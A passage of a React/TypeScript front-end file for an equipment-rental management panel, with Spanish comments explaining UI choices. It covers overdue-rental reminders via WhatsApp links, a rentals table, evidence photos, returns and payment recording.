  }, [])
  useRecurso(['rentas'], load)

  if (!datos || datos.total === 0) return null

  const texto = (f: FilaRecordatorio) =>
    f.dias < 0
      ? `Hola${f.cliente ? ' ' + f.cliente : ''}, te escribimos de REMALI. La renta de ${f.equipo} venció hace ${Math.abs(f.dias)} día${Math.abs(f.dias) > 1 ? 's' : ''}. ¿La traes tú o pasamos por ella? También podemos extenderla si la sigues necesitando.`
      : f.dias === 0
        ? `Hola${f.cliente ? ' ' + f.cliente : ''}, te escribimos de REMALI. Hoy termina la renta de ${f.equipo}. ¿La traes tú o pasamos por ella?`
        : `Hola${f.cliente ? ' ' + f.cliente : ''}, te escribimos de REMALI. Mañana termina la renta de ${f.equipo}. Si necesitas más días, con gusto la extendemos.`

  const etiqueta = (d: number) =>
    d < 0 ? `${Math.abs(d)} día${Math.abs(d) > 1 ? 's' : ''} de retraso` : d === 0 ? 'Vence hoy' : 'Vence mañana'

  const filas = [...datos.vencidas, ...datos.por_vencer]

  return (
    <Card className="p-0 overflow-hidden">
      <button onClick={() => setAbierto(a => !a)}
        className="w-full px-5 py-4 flex items-center justify-between gap-3 text-left hover:bg-surface-2 transition-colors">
        <div className="min-w-0">
          <p className="text-[13.5px] font-black text-ink">A quién recordarle</p>
          <p className="text-[12px] text-mute mt-0.5">
            {datos.vencidas.length > 0 && <span className="text-red-500 font-bold">{datos.vencidas.length} vencida{datos.vencidas.length > 1 ? 's' : ''}</span>}
            {datos.vencidas.length > 0 && datos.por_vencer.length > 0 && ' · '}
            {datos.por_vencer.length > 0 && `${datos.por_vencer.length} por vencer`}
          </p>
        </div>
        <span className={`text-mute transition-transform ${abierto ? 'rotate-180' : ''}`} aria-hidden>▾</span>
      </button>

      {abierto && (
        <ul className="border-t border-edge divide-y divide-edge">
          {filas.map(f => {
            const wa = waLink(f.telefono, texto(f))
            return (
              <li key={f.renta_id} className="px-5 py-3 flex items-center gap-3 flex-wrap">
                <div className="min-w-0 flex-1">
                  <p className="text-[13px] font-bold text-ink truncate">{f.cliente || 'Cliente sin nombre'}</p>
                  <p className="text-[11.5px] text-mute truncate">
                    {f.equipo} · {f.codigo} ·{' '}
                    <span className={f.dias < 0 ? 'text-red-500 font-semibold' : ''}>{etiqueta(f.dias)}</span>
                  </p>
                </div>
                {/* Quien ya recibió el aviso en su cuenta no necesita llamada:
                    así la insistencia se gasta donde de verdad hace falta. */}
                {f.tiene_cuenta && (
                  <span className="text-[10.5px] font-bold px-2 py-0.5 rounded bg-surface-2 text-mute shrink-0">Ya se le avisó en la app</span>
                )}
                {wa ? (
                  /* Verde de WhatsApp, no el dorado. Dos razones:
                     · El color es DATO: el verde dice por qué canal se va a
                       escribir, y este renglón ya tiene una acción de sistema
                       al lado ("+ Abono" en otras listas) que sí es dorada.
                     · El dorado es el acento de la ACCIÓN PRIMARIA, y aquí no
                       lo es: la primaria de esta tarjeta es enterarse de a
                       quién hay que insistirle, no escribirle a uno.
                     Las medidas y el tinte son los del botón de WhatsApp que ya
                     existe en el armador (Cotizacion.tsx): mismo canal, mismo
                     botón en todo el sistema. */
                  <a href={wa} target="_blank" rel="noopener noreferrer"
                    className="h-8 px-3 shrink-0 inline-flex items-center rounded-lg bg-emerald-500/15 text-emerald-700 dark:text-emerald-400 text-[12px] font-bold hover:bg-emerald-500/25 transition-colors">
                    WhatsApp
                  </a>
                ) : (
                  <span className="text-[11.5px] text-mute shrink-0">Sin teléfono</span>
                )}
              </li>
            )
          })}
        </ul>
      )}
    </Card>
  )
}

function RentasAdmin({ reload, notify }: { reload: () => void; notify: Notify }) {
  const [estado, setEstado] = useState<'reservada' | 'activa' | 'finalizada' | 'cancelada'>('activa')
  const [rentas, setRentas] = useState<RentaFull[]>([])
  const [loading, setLoading] = useState(true)
  const [verRenta, setVerRenta] = useState<RentaFull | null>(null)
  /** La renta que se está renovando desde el menú de la fila, sin abrir su detalle. */
  const [renovarRenta, setRenovarRenta] = useState<RentaFull | null>(null)
  const [entradaAvance, setEntradaAvance] = useState(false)
  const { devolver: devolverRenta, modalCobro } = useDevolverRenta(notify)

  const load = useCallback(() => {
    setLoading(true)
    api.get<{ rentas: RentaFull[] }>(`/rentas/?estado=${estado}`, { fondo: true }).then(r => setRentas(r.data?.rentas || [])).catch(() => setRentas([])).finally(() => setLoading(false))
  }, [estado])
  useEffect(() => { load() }, [load])

  /* Alguien llegó aquí desde otra pantalla pidiendo VER una renta concreta.
     Se busca entre todas —no solo entre las del filtro actual—, porque la que
     te mandaron a ver bien puede estar finalizada y el filtro abre en activas. */
  useEffect(() => {
    const id = tomarRentaAAbrir()
    if (!id) return
    const enVuelo = tomarRentaEnVuelo(id)
      ?? api.get<{ rentas: RentaFull[] }>('/rentas/?estado=todas')
        .then(r => (r.data?.rentas || []).find(x => x.id === id) ?? null)
        .catch(() => null)
    const avance = tomarLlegaDeTraspaso()
    enVuelo.then(renta => {
      if (renta) { setEntradaAvance(avance); setVerRenta(renta) }
      else notify(`No encontramos la renta #${id}`, 'err')
    })
    // Solo al montar: el puente es de un solo uso.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  async function devolver(r: RentaFull) {
    if (!await confirmar({ titulo: `¿Marcar como devuelto el equipo de ${r.cliente_nombre || r.cliente || 'cliente'}?`, mensaje: 'La renta se cierra y la unidad vuelve a quedar disponible. Si trae saldo, se cobra antes de cerrar.', aceptar: 'Marcar devuelto' })) return
    devolverRenta(r.id, () => { load(); reload() })
  }

  async function cancelar(r: RentaFull) {
    if (!await confirmar({ titulo: `¿Cancelar esta ${r.estado === 'reservada' ? 'reserva' : 'renta'}?`, mensaje: 'Se liberará la unidad.', aceptar: 'Cancelar', cancelar: 'Volver', tono: 'peligro' })) return
    api.post(`/rentas/${r.id}/cancelar/`).then(() => { notify('Renta cancelada', 'neutro'); load(); reload() }).catch(e => notify(e?.response?.data?.detalle || 'Error', 'err'))
  }

  const vencidas = rentas.filter(r => r.vencida).length
  /* El umbral lo pone el servidor (`por_vencer`), que lo calcula proporcional a
     la duración. El `?? false` es el respaldo mientras un backend viejo no mande
     el campo: antes que enseñar una alarma equivocada, no se enseña ninguna. */
  const porVencer = rentas.filter(r => !r.vencida && (r.por_vencer ?? false)).length
  const enTiempo = Math.max(rentas.length - vencidas - porVencer, 0)
  // "Finalizadas" es un historial que solo crece: se pagina. Las cifras de
  // arriba (vencidas, por vencer) siguen mirando la lista completa del estado.
  const { enPantalla, ancla, props: pagProps } = usePaginado(rentas, undefined, [estado])

  return (
    <div className="space-y-5">
      {renovarRenta && (
        <RenovarRentaModal
          renta={renovarRenta} notify={notify}
          onClose={() => setRenovarRenta(null)}
          onHecho={() => { setRenovarRenta(null); load(); reload() }}
        />
      )}
      {verRenta && <RentaDetalleModal renta={verRenta} avance={entradaAvance} onClose={() => { setVerRenta(null); setEntradaAvance(false) }} onOrdenCarta={() => abrirOrdenCartaPDF('rentas', verRenta.id)} notify={notify} onChanged={() => { load(); reload() }} />}
      {modalCobro}
      {/* KPIs */}
      <KpiGrid
        items={[
          {
            label: estado === 'activa' ? 'Rentas activas' : estado === 'reservada' ? 'Reservas' : estado === 'cancelada' ? 'Canceladas' : 'Finalizadas',
            value: rentas.length, tone: 'info',
            /* La cifra sola no dice nada: "3" puede ser toda la operación o una
               tercera parte parada. El helper la pone contra la flota. */
            helper: estado === 'activa' ? (rentas.length ? `${enTiempo} en tiempo · ${porVencer + vencidas} por atender` : 'nada en obra ahora mismo') : undefined,
            icon: <><rect x="3" y="4.5" width="18" height="16" rx="2" /><path d="M3 9h18M8 3v3m8-3v3" /><path d="M12 13v3l2 1" /></>,
          },
          {
            label: 'Por vencer (≤2d)', value: porVencer, tone: 'warning', emphasis: porVencer > 0,
            helper: porVencer ? 'avisa al cliente antes de que se pase' : 'nada se vence esta semana',
            icon: <><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></>,
          },
          {
            label: 'Vencidas', value: vencidas, tone: 'danger', emphasis: vencidas > 0,
            helper: vencidas ? 'la unidad sigue fuera: hay que recogerla' : 'todo devuelto a tiempo',
            icon: <><path d="M10.3 4.3 2.6 18a2 2 0 0 0 1.7 3h15.4a2 2 0 0 0 1.7-3L13.7 4.3a2 2 0 0 0-3.4 0z" /><path d="M12 9v4m0 4h.01" /></>,
          },
        ]}
      />

      <Card ref={ancla} className="overflow-hidden scroll-mt-24">
        {/* Toolbar */}
        <CardBarra>
          <Segmentado
            forma="pastilla"
            valor={estado}
            onChange={k => setEstado(k as typeof estado)}
            opciones={[
              { key: 'activa', label: 'Activas' },
              { key: 'reservada', label: 'Reservas' },
              { key: 'finalizada', label: 'Finalizadas' },
              { key: 'cancelada', label: 'Canceladas' },
            ]}
          />
          <div className="flex items-center gap-2 flex-wrap">
            {estado === 'activa' && vencidas > 0 && (
              <span className="px-3 py-1.5 rounded-full border border-[color-mix(in_oklab,var(--c-vencida)_34%,transparent)] bg-[color-mix(in_oklab,var(--c-vencida)_10%,transparent)] text-[var(--c-vencida)] text-[11.5px] font-bold flex items-center gap-1.5 tabular-nums">
                <span className="w-1.5 h-1.5 rounded-full bg-[var(--c-vencida)] animate-pulse motion-reduce:animate-none" />{vencidas} vencida{vencidas > 1 ? 's' : ''} por recoger
              </span>
            )}
            <BotonExportar onClick={() => descargarReporte('/rentas/export/', { estado }, `reporte_rentas_${estado}.csv`, notify)} />
          </div>
        </CardBarra>

        {/* Tabla */}
        <div className="overflow-x-auto">
          <table className="tabla-panel w-full min-w-[820px] text-left">
            <thead>
              <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                <th className="font-semibold px-5 py-3">Equipo</th>
                <th className="font-semibold px-3 py-3">Cliente</th>
                <th className="font-semibold px-3 py-3">Ubicación</th>
                <th className="font-semibold px-3 py-3">Periodo</th>
                <th className="font-semibold px-3 py-3 text-right">Total</th>
                <th className="font-semibold px-3 py-3">Vencimiento</th>
                <th className="font-semibold px-5 py-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-edge">
              {enPantalla.map(r => (
                <tr key={r.id} className={`hover:bg-surface-2 transition-colors ${r.vencida ? 'bg-red-500/5' : ''}`}>
                  <td className="px-5 py-3">
                    <p className="text-sm font-semibold text-ink truncate">{r.inventario.equipo}</p>
                    <p className="font-mono text-[11px] text-mute">{r.inventario.codigo}</p>
                  </td>
                  <td data-col="Cliente" className="px-3 py-3 max-w-[220px]">
                    <p className="text-sm text-ink truncate">
                      {r.obra
                        ? (r.obra.responsable || r.cliente || r.empresa?.nombre || 'Encargado')
                        : (r.cliente || r.empresa?.nombre || r.cliente_nombre || 'Cliente')}
                    </p>
                  </td>
                  <td data-col="Ubicación" className="px-3 py-3 max-w-[200px]"><p className="text-xs text-mute truncate">{r.direccion}</p></td>
                  {/* Tres renglones apilados hacían esta fila casi el doble de
                      alta que la de Reparaciones, y el importe metido aquí no se
                      podía comparar de un vistazo con el de arriba y el de
                      abajo. Ahora: una línea, y el dinero en su propia columna
                      alineado a la derecha, que es como se leen las cifras. */}
                  <td data-col="Periodo" className="px-3 py-3 whitespace-nowrap">
                    <p className="text-[13px] text-ink capitalize">{r.modalidad}</p>
                    <p className="text-[11px] text-mute font-mono">{r.fecha_inicio || ''} → {r.fecha_fin}</p>
                  </td>
                  <td data-col="Total" className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap">
                    <span>{r.total ? `$${Number(r.total).toLocaleString('en-US', { minimumFractionDigits: 2 })}` : '—'}</span>
                  </td>
                  <td data-col="Vencimiento" className="px-3 py-3 whitespace-nowrap">
                    {estado === 'activa' && (r.fase === 'por_entregar' || r.fase === 'en_camino') ? (
                      /* Todavía no sale o va en camino: contar "días restantes"
                         de una máquina que sigue en bodega no significa nada.
                         Lo que importa aquí es que aún no se entrega. */
                      <span className={`text-xs font-bold ${r.fase === 'en_camino' ? 'text-renta' : 'text-mute'}`}>
                        {r.fase === 'en_camino' ? '→ En camino' : '○ Por entregar'}
                      </span>
                    ) : estado === 'activa' ? (
                      <span className={`text-xs font-bold ${r.vencida ? 'text-red-500' : r.por_vencer ? 'text-taller-ink' : 'text-mute'}`}>
                        {/* Con menos de un día por delante la cuenta pasa a
                            HORAS: "0d restantes" no dice si quedan diez horas o
                            diez minutos, que es justo lo que hay que saber para
                            salir a recogerla. */}
                        {r.vencida ? '⚠ Vencida'
                          : (r.horas_restantes !== undefined && r.horas_restantes < 24)
                            ? `${Math.max(1, Math.round(r.horas_restantes))} h restantes`
                            : `${r.dias_restantes}d restantes`}
                      </span>
                    ) : (
                      <span className="text-[10px] px-2 py-0.5 rounded-md bg-surface-2 text-mute font-semibold uppercase">
                        {estado === 'reservada' ? 'Reservada' : estado === 'cancelada' ? 'Cancelada' : 'Finalizada'}
                      </span>
                    )}
                  </td>
                  {/* Cuatro botones con texto y `flex-wrap`: en cuanto la
                      columna se estrechaba se partían en dos renglones y la fila
                      crecía el doble. Reparaciones ya resolvía esto con el menú
                      de la casa —una sola línea, siempre— y aquí se usa el
                      mismo. Nada se pierde: las acciones son las mismas, y con
                      su nombre completo en vez de un ícono a adivinar. */}
                  <td className="px-5 py-3 text-right" onClick={e => e.stopPropagation()}>
                    <div className="flex items-center justify-end">
                      <MenuFila
                        etiqueta="Acciones"
                        opciones={[
                          { label: 'Ver detalle', onClick: () => setVerRenta(r), icono: <svg className="w-[17px] h-[17px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M2.5 12S6 5.5 12 5.5 21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12z" /><circle cx="12" cy="12" r="2.6" /></svg> },
                          { label: 'Orden en carta (PDF)', onClick: () => abrirOrdenCartaPDF('rentas', r.id), icono: <svg className="w-[17px] h-[17px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z" /><path d="M14 3v5h5" /></svg> },
                          ...((estado === 'activa' || estado === 'finalizada') ? [{
                            label: estado === 'activa' ? 'Renovar' : 'Volver a rentar',
                            onClick: () => setRenovarRenta(r),
                            icono: <svg className="w-[17px] h-[17px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M21 12a9 9 0 1 1-2.6-6.4" /><path d="M21 4v5h-5" /></svg>,
                          }] : []),
                          ...(estado === 'activa' ? [{
                            label: 'Marcar devuelto', onClick: () => devolver(r),
                            icono: <svg className="w-[17px] h-[17px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><polyline points="9 14 4 9 9 4" /><path d="M20 20v-7a4 4 0 0 0-4-4H4" /></svg>,
                          }] : []),
                          ...((estado === 'activa' || estado === 'reservada') ? [{
                            label: estado === 'reservada' ? 'Cancelar reserva' : 'Cancelar renta',
                            onClick: () => cancelar(r), peligro: true,
                            icono: <svg className="w-[17px] h-[17px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>,
                          }] : []),
                        ]}
                      />
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {loading && <FilasEsqueleto filas={5} columnas={4} />}
          {!loading && rentas.length === 0 && (
            <EstadoVacio
              titulo={estado === 'activa' ? 'Ninguna máquina está en obra' : estado === 'reservada' ? 'Sin reservas' : estado === 'cancelada' ? 'Sin rentas canceladas' : 'Todavía no hay historial'}
              mensaje={estado === 'activa'
                ? 'Cuando rentes una unidad aparecerá aquí con su fecha de devolución.'
                : 'Aquí se irán guardando las rentas conforme cambien de estado.'}
              icono={<><rect x="3" y="4.5" width="18" height="16" rx="2" /><path d="M3 9h18M8 3v3m8-3v3" /><path d="M12 13v3l2 1" /></>}
            />
          )}
        </div>
        <Paginador {...pagProps} nombre="rentas" />
      </Card>
    </div>
  )
}

/** Fotos del equipo al entregarlo y al recibirlo, agrupadas por momento. */
function EvidenciasRenta({ rentaId }: { rentaId: number }) {
  const [fotos, setFotos] = useState<Evidencia[]>([])
  const [subiendo, setSubiendo] = useState<string | null>(null)
  const [error, setError] = useState('')
  const [zoom, setZoom] = useState<Evidencia | null>(null)
  const inputs = useRef<Record<string, HTMLInputElement | null>>({})

  const cargar = useCallback(() => {
    api.get<{ evidencias: Evidencia[] }>(`/rentas/${rentaId}/evidencias/`)
      .then(r => setFotos(r.data?.evidencias || [])).catch(anotarFallo)
  }, [rentaId])
  useEffect(() => { cargar() }, [cargar])

  function subir(momento: 'entrega' | 'devolucion', ev: React.ChangeEvent<HTMLInputElement>) {
    const files = Array.from(ev.target.files || [])
    ev.target.value = ''
    if (!files.length) return
    const fd = new FormData()
    fd.append('momento', momento)
    files.forEach(f => fd.append('imagenes', f))
    setError(''); setSubiendo(momento)
    api.post(`/rentas/${rentaId}/evidencias/`, fd, { headers: { 'Content-Type': 'multipart/form-data' } })
      .then(() => cargar())
      .catch(err => setError(errorMsg(err, 'No se pudieron subir las fotos')))
      .finally(() => setSubiendo(null))
  }
  async function borrar(id: number) {
    if (!await confirmar({ titulo: '¿Quitar esta foto?', mensaje: 'Es evidencia del estado del equipo: sin ella no hay respaldo si el cliente reclama un daño.', aceptar: 'Quitar', tono: 'peligro' })) return
    api.delete(`/rentas/${rentaId}/evidencias/${id}/`)
      .then(() => cargar())
      .catch(err => setError(errorMsg(err, 'No se pudo quitar')))
  }

  const bloque = (momento: 'entrega' | 'devolucion', titulo: string) => {
    const suyas = fotos.filter(f => f.momento === momento)
    return (
      <div>
        <div className="flex items-center justify-between mb-2">
          <p className="text-[12px] font-bold text-ink">{titulo} <span className="text-mute font-normal">({suyas.length})</span></p>
          <button onClick={() => inputs.current[momento]?.click()} disabled={subiendo === momento}
            className="text-[11.5px] font-bold text-gold-ink hover:opacity-80 disabled:opacity-50">
            {subiendo === momento ? 'Subiendo…' : '+ Agregar fotos'}
          </button>
          <input aria-label="Fotos de evidencia" ref={el => { inputs.current[momento] = el }} type="file" accept="image/*" multiple className="hidden" onChange={e => subir(momento, e)} />
        </div>
        {suyas.length === 0 ? (
          <button onClick={() => inputs.current[momento]?.click()}
            className="w-full py-5 rounded-[10px] border border-dashed border-edge text-[12px] text-mute hover:text-ink hover:border-gold/50 transition-colors">
            Sin fotos todavía
          </button>
        ) : (
          <div className="grid grid-cols-4 sm:grid-cols-5 gap-2">
            {suyas.map(f => (
              <div key={f.id} className="relative group aspect-square rounded-[9px] overflow-hidden border border-edge bg-surface-2">
                <button onClick={() => setZoom(f)} className="w-full h-full" title={f.nota || 'Ver foto'}>
                  <img src={resolveMediaUrl(f.imagen)} alt={f.nota || titulo} className="w-full h-full object-cover" />
                </button>
                <button onClick={() => borrar(f.id)} aria-label="Quitar foto"
                  className="absolute top-1 right-1 w-5 h-5 rounded-md bg-black/60 text-white opacity-0 group-hover:opacity-100 focus:opacity-100 transition-opacity flex items-center justify-center">
                  <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg>
                </button>
              </div>
            ))}
          </div>
        )}
      </div>
    )
  }

  return (
    <div className="space-y-5">
      {bloque('entrega', 'Al entregar')}
      {bloque('devolucion', 'Al recibir de vuelta')}
      {error && <p className="text-[12px] text-red-500">{error}</p>}
      {zoom && createPortal(
        <Modal className="modal-in fixed inset-0 z-[70] bg-black/75 flex items-center justify-center p-4" onClose={() => setZoom(null)} label="Foto de evidencia">
          <div className="max-w-3xl w-full" onClick={e => e.stopPropagation()}>
            <img src={resolveMediaUrl(zoom.imagen)} alt={zoom.nota} className="w-full max-h-[80vh] object-contain rounded-xl" />
            <p className="text-center text-[12.5px] text-white/80 mt-3">
              {zoom.momento_label}
              {zoom.nota ? ` · ${zoom.nota}` : ''}
              {' · '}{new Date(zoom.creada).toLocaleString('es-MX')}
              {zoom.subida_por ? ` · ${zoom.subida_por}` : ''}
            </p>
          </div>
        </Modal>, document.body)}
    </div>
  )
}

/* Recoger la máquina.

   Ya no hay cobro forzado en la puerta. El backend cierra la devolución SIEMPRE
   —el piso de liquidación es meta de cobranza, no candado— y lo que quede se va
   a Adeudos, con aviso a administración el mismo día.

   El cobro en la puerta desapareció porque la razón de existir era el bloqueo, y
   el bloqueo estaba mal por tres motivos:

     · El recargo por retraso NACE al cerrar la devolución. Rechazarla revertía
       la transacción y con ella el recargo, así que la pantalla pedía cobrar un
       saldo que en la base valía cero: "Saldo actual: $10,800" arriba y "el
       abono es mayor al saldo ($0.00)" abajo. No se podía pagar lo que no
       existía, ni existir sin pagarlo.
     · No recoger subía el recargo al día siguiente, y con él el propio piso: el
       faltante crecía más rápido de lo que se podía cobrar.
     · Al final de una renta la empresa quiere su máquina de vuelta; retenerla
       castiga más a quien la presta que a quien debe.

   Quien quiera cobrar antes de cerrar tiene el botón de siempre: "Registrar
   abono" en el detalle de la renta, y "Registrar cobro" en la hoja del técnico.
   La palanca de cobro vive ahora al LEVANTAR la siguiente renta, donde sí hay un
   administrador presente (ver `crear_renta`). */
function useDevolverRenta(notify: Notify) {
  async function devolver(rentaId: number, alTerminar: () => void) {
    try {
      const r = await api.post(`/rentas/${rentaId}/devolver/`)
      const d = r.data?.detalle || 'Equipo devuelto'
      // Con saldo vivo el aviso va en ámbar: la máquina volvió, pero el cobro no
      // terminó y eso no puede leerse como un cierre limpio.
      notify(d, Number(r.data?.renta?.saldo || 0) > 0 ? 'warning' : 'ok')
      alTerminar()
      return true
    } catch (err) {
      const d = (err as { response?: { data?: { detalle?: string } } })?.response?.data
      notify(d?.detalle || 'Error al devolver', 'err')
      return false
    }
  }

  // `modalCobro` se conserva en la firma para no tocar los cinco lugares que lo
  // pintan; ya no hay nada que mostrar.
  return { devolver, modalCobro: null }
}

function RentaDetalleModal({ renta: r, onClose, onOrdenCarta, notify, onChanged, avance = false }: { renta: RentaFull; onClose: () => void; onOrdenCarta: () => void; notify?: Notify; onChanged?: () => void; avance?: boolean }) {
  const money = formatMoney
  const [renovando, setRenovando] = useState(false)
  // Sustituir la máquina por avería: la actual entra a mantenimiento y una de
  // repuesto (del mismo equipo, disponible) toma la renta sin cambiar términos.
  async function sustituirPorAveria() {
    const equipoId = r.inventario.equipo_id
    if (!equipoId) { notify?.('No se pudo identificar el equipo', 'err'); return }
    try {
      const resp = await api.get<Unidad[]>(`/equipos/${equipoId}/unidades/`, { fondo: true })
      const libres = (resp.data || []).filter(u => u.estado === 'disponible' && u.id !== r.inventario.id)
      if (!libres.length) {
        await confirmar({ titulo: 'Sin repuesto disponible', mensaje: `No hay otra unidad de ${r.inventario.equipo || 'este equipo'} disponible. Libera o registra una para poder sustituir.`, aceptar: 'Entendido' })
        return
      }
      const sel = await elegir({
        titulo: 'Unidad de repuesto',
        mensaje: `La actual (${r.inventario.codigo}) entrará a mantenimiento por avería.`,
        opciones: libres.map(u => ({ valor: String(u.id), label: u.codigo, detalle: u.numero_serie ? `S/N ${u.numero_serie}` : 'Disponible' })),
      })
      if (!sel || !sel[0]) return
      const motivo = await pedir({ titulo: 'Motivo de la avería (opcional)', placeholder: 'Ej. Se fundió el motor' })
      if (motivo === null) return   // canceló
      const res = await api.post<{ detalle?: string }>(`/rentas/${r.id}/sustituir-unidad/`, { nueva_unidad_id: Number(sel[0]), motivo: motivo || '' })
      notify?.(res.data?.detalle || 'Unidad sustituida', 'ok')
      onChanged?.()
      onClose()
    } catch (e) {
      notify?.((e as { response?: { data?: { detalle?: string } } })?.response?.data?.detalle || 'No se pudo sustituir', 'err')
    }
  }
  // Cuenta de cliente vinculada; se puede asignar o cambiar aquí mismo,
  // para las rentas que se registraron sin elegirla.
  const [cuenta, setCuenta] = useState<string | null>(r.cuenta ?? null)
  // Pagos: muchos clientes conocidos pagan DESPUÉS; aquí se abonan.
  const [pagos, setPagos] = useState(r.pagos || [])
  const [pagado, setPagado] = useState(Number(r.pagado || 0))
  const [saldo, setSaldo] = useState(Number(r.saldo ?? r.total ?? 0))
  const [abonando, setAbonando] = useState(false)
  /* Sin `catch`: el rechazo tiene que llegarle al AbonoModal, que lo pinta
     junto al campo que hay que corregir y se queda abierto con lo capturado.
     Tragárselo aquí —"el interceptor avisa"— era la mentira que dejaba el botón
     volviendo a su sitio sin una palabra: el interceptor solo avisa de red
     caída y de 5xx, y estos endpoints rechazan con 400 y 403. */
  async function guardarAbono(monto: number, metodo: string, fecha: string) {
    const resp = await api.post<{ renta: RentaFull }>(`/rentas/${r.id}/abonos/`, { monto, metodo, fecha: fecha || undefined })
    setPagos(resp.data.renta.pagos || [])
    setPagado(Number(resp.data.renta.pagado || 0))
    setSaldo(Number(resp.data.renta.saldo || 0))
    setAbonando(false)
  }
  // Bandeja de facturación: el timbrado es externo; desde aquí solo se manda.
  const [factura, setFactura] = useState<string | null>(r.factura_estado ?? null)
  const [mandandoFactura, setMandandoFactura] = useState(false)
  async function mandarPorFacturar() {
    setMandandoFactura(true)
    try {
      await api.post(`/rentas/${r.id}/por-facturar/`, {})
      setFactura('pendiente')
    } catch (e) {
      const detalle = (e as { response?: { data?: { detalle?: string } } })?.response?.data?.detalle
      if (detalle) await confirmar({ titulo: 'Facturación', mensaje: detalle, aceptar: 'Entendido' })
    } finally { setMandandoFactura(false) }
  }
  const [liga, setLiga] = useState('')
  const [genLiga, setGenLiga] = useState(false)
  const [buscandoCuenta, setBuscandoCuenta] = useState(false)
  const [copiado, setCopiado] = useState(false)
  async function generarLiga() {
    setGenLiga(true)
    try {
      const res = await api.post<{ ruta: string }>(`/rentas/${r.id}/vinculo/`, {}, { fondo: true })
      setLiga(`${window.location.origin}${res.data.ruta}`)
    } catch { /* el interceptor ya avisa */ } finally { setGenLiga(false) }
  }
  /* Se busca, no se elige de una lista. Antes se bajaban TODAS las cuentas y se
     pintaban en el diálogo: con cuatrocientos clientes eso es una tira infinita
     con alguien esperando enfrente. */
  async function vincularCuenta(c: CuentaCliente) {
    setBuscandoCuenta(false)
    try {
      const res = await api.post<{ cuenta: string | null }>(`/rentas/${r.id}/vincular/`, { usuario_id: c.id })
      setCuenta(res.data?.cuenta || null)
    } catch { /* el interceptor ya avisa el error */ }
  }
  const esObra = !!r.obra
  const encargado = esObra ? (r.obra?.responsable || r.cliente) : undefined
  const cliente = !esObra ? (r.cliente || r.cliente_nombre) : undefined
  const telefono = esObra ? (r.obra?.telefono || r.telefono_cliente) : r.telefono_cliente
  const sub = Number(r.subtotal || 0)
  const tot = Number(r.total || 0)
  const rec = Number(r.recargo || 0)
  const desc = Number(r.descuento || 0)
  const dep = Number(r.deposito || 0)
  const iva = Math.max(0, Math.round((tot - sub - rec) * 100) / 100)
  const modLabel = ({ dia: 'Por día', semana: 'Por semana', mes: 'Por mes' } as Record<string, string>)[r.modalidad] || r.modalidad
  const chip = (r.estado === 'activa' && r.vencida)
    ? { label: 'VENCIDA', cls: 'bg-red-500/10 text-red-500' }
    : (({
        activa: { label: 'ACTIVA', cls: 'bg-blue-500/10 text-blue-600' },
        reservada: { label: 'RESERVADA', cls: 'bg-blue-500/10 text-blue-600' },
        finalizada: { label: 'FINALIZADA', cls: 'bg-emerald-500/10 text-emerald-600' },
        cancelada: { label: 'CANCELADA', cls: 'bg-red-500/10 text-red-500' },
      } as Record<string, { label: string; cls: string }>)[r.estado || 'activa'] || { label: (r.estado || '—').toUpperCase(), cls: 'bg-surface-2 text-mute' })

  return createPortal(
    <Modal className={`fixed inset-0 z-[60] bg-[rgba(33,29,22,0.4)] backdrop-blur-[2px] flex items-start justify-center p-0 sm:p-6 overflow-y-auto ${avance ? 'modal-avance' : 'modal-in'}`} onClose={onClose} label="Detalle de la renta">
      <div onClick={(e: React.MouseEvent) => e.stopPropagation()} className="w-full sm:max-w-[720px] bg-surface rounded-none sm:rounded-[16px] shadow-[0_24px_60px_rgba(33,29,22,0.2)] min-h-screen sm:min-h-0 sm:my-auto sm:max-h-[92vh] flex flex-col overflow-hidden border-0 sm:border border-edge">
        {/* Header */}
        <div className="px-6 sm:px-[26px] pt-[22px] pb-[18px] border-b border-edge flex items-start justify-between gap-3 shrink-0">
          <div className="min-w-0">
            <div className="flex items-center gap-2 mb-2.5">
              <span className="text-[10.5px] font-bold tracking-[0.5px] text-mute">DETALLE DE RENTA</span>
              <span className={`text-[10.5px] px-2.5 py-[3px] rounded-md font-bold ${chip.cls}`}>{chip.label}</span>
              {factura && (
                <span className={`text-[10.5px] px-2.5 py-[3px] rounded-md font-bold ${factura === 'facturada' ? 'bg-violet-500/10 text-violet-600' : 'bg-amber-500/10 text-taller-ink'}`}>
                  {factura === 'facturada' ? 'FACTURADA' : 'POR FACTURAR'}
                </span>
              )}
            </div>
            <h2 className="text-[20px] font-extrabold text-ink truncate">{r.inventario.equipo || 'Equipo'}</h2>
            <p className="font-mono text-[12.5px] text-mute mt-0.5">{r.inventario.codigo}{r.inventario.numero_serie ? ` · S/N ${r.inventario.numero_serie}` : ''}</p>
          </div>
          <button onClick={onClose} className="w-8 h-8 rounded-[9px] flex items-center justify-center text-mute hover:text-ink hover:bg-surface-2 transition-colors shrink-0" aria-label="Cerrar"><svg className="w-[18px] h-[18px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg></button>
        </div>

        <div className="overflow-y-auto flex-1">
          {buscandoCuenta && (
            <BuscarCuenta
              titulo="Vincular a una cuenta"
